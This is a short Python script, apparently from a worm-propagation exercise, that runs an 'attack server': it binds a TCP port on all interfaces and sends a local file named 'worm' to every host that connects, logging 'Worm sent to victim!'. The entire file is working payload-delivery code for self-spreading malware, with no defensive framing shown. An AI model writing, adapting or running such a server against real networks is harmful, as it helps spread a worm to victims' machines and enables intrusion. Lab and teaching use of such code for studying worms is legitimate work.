#!/usr/bin/env python3
import sys
import socket

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} attack_server_port")
    exit()

ATTACK_SERVER_PORT = int(sys.argv[1])

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # IPv4, TCP
server.bind(("0.0.0.0", ATTACK_SERVER_PORT)) # listen to all IPs
server.listen(5)
print(f"[*] Attack server listening on port {ATTACK_SERVER_PORT}")

while True:
    skt = None
    try:
        skt, addr = server.accept()
        print(f"Connected with ip {addr[0]}, port {addr[1]}")
        with open('worm','rb') as f:
            worm = f.read()
        skt.sendall(worm) # sendall sends the data until all the data is sent
        print("Worm sent to victim!")
        skt.close()
    except KeyboardInterrupt:
        print("Receive keyboard interrupt, terminating...")
        server.close()
        break
    except Exception as e:
        print(f'Exception: {e}')
        if skt:
            skt.close()
